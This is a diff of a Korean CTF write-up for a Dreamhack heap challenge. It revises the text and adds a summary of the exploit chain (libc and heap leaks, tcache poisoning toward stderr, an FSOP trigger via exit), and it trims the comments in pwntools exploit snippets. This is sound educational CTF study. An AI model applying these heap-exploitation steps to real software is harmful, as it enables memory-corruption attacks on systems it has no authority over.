@@ -1,6 +1,6 @@
 ---
 title: "[DREAMHACK] Isn't it num? writeup"
-date: 2026-03-08 19:50:00
+date: 2026-03-08 22:20:00
 categories: Essay
 tags: [writeup]
 ---
@@ -164,9 +164,6 @@ v4 = *((_DWORD *)&data + 4 * v10);
 즉, 청크 두 개 큰 거 만들어두고  
 앞 청크를 `realloc()`하면 `free()`할 수 있다.  
 
-0번째 idx를 큰 청크로 사용할 예정이다.  
-1번째 idx에는 적당한 청크를 넣은 뒤 `realloc`으로 `old free`되는 현상을 이용할 것이다.  
-
 [>> _int_realloc 소스 링크 <<](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4816)
 
 대략적으로 코드를 발췌하면 다음과 같다.  
@@ -206,13 +203,16 @@ v4 = *((_DWORD *)&data + 4 * v10);
 이전 코드에는 `top chunk`로의 확장,  
 다음 청크로의 확장,  
 또는 이 둘이 불가능할 경우,  
-새 메모리를 만들고 내용을 복사한 뒤 `old chunk`를 `free()`한다.  
+새 메모리를 만들고 내용을 복사한 뒤 `old chunk`를 `free()`한다.    
 
-이 점을 이용해 원하는 청크를 `unsorted bin`으로 보내 `libc base`를 얻을 것이다.  
-`tcache bin`으로 보내 `heap_base`도 얻을 수 있다.  
+시나리오를 요약하면 다음과 같다.
 
-최종적으로는 원하는 위치인 `stderr`을 할당하도록 조작하여  
-그 위치에 `FSOP` 페이로드를 작성할 것이다.  
+1. 청크 하나를 `unsorted bin`으로 보내 `libc leak`
+2. 청크 하나를 `tcache bin`으로 보내 `heap base leak`
+3. `tcache poisoning`으로 `stderr` 할당 유도
+4. `exit()`
+
+이것은 `realloc()`을 이용한 `free()`가 가능하기에 쉽게 되었다.
 
 ```py
 #!/usr/bin/env python3
@@ -317,6 +317,7 @@ add(3, 0) # 크게 만들어서 넣기
 create(4, 11, b'', 0)
 show(4)
 
+# safe linking
 heap = (u64(rl().strip().ljust(8, b'\x00')) << 12)
 slog("heap_base", heap)
 # 5, 6, 7
@@ -380,10 +381,7 @@ Size: 0x10c50 (with flag bits: 0x10c51)
 ...
 
 ```py
-add(0, 1) # 이걸로 unsorted bin에 보내기
-# 빈 거 하나 올리고
-# 가장 작은 청크 아래 올리고
-# 아래에 unsorted bin 있으니까 null 종결까지 쭉 읽기
+add(0, 1) 
 create(2, 11, b'', 0)
 show(2)
 
@@ -432,9 +430,8 @@ all: 0x615f813292b0 —▸ 0x7e490ae19ce0 ◂— 0x615f813292b0
 ...
 
 ```py
-create(3, 11, b'A'*0x10, 0x10) # 0x20, 또 작은 거 올린 뒤
-add(3, 0) # 크게 만들어서 넣기
-# -> tcache bin으로 보낼거, 큰 친구는 largebin으로 감
+create(3, 11, b'A'*0x10, 0x10)
+add(3, 0)
 
 create(4, 11, b'', 0)
 show(4)
@@ -524,4 +521,8 @@ largebins
 ---
 필요한 건 여기까지라고 판단했다.  
 힙 익스 쪽을 더 공부해야겠다..  
-나름 고생을 많이 했는데 롸업 퀄이 떨어져서 아쉽다.
+나름 고생을 많이 했는데 롸업 퀄이 떨어져서 아쉽다.  
+주석도 제대로 넣다 말다 해서 이해에 방해가 될 것 같다. 다시 보니까..  
+
+
+잘못된 점이 있으면 알려주세요
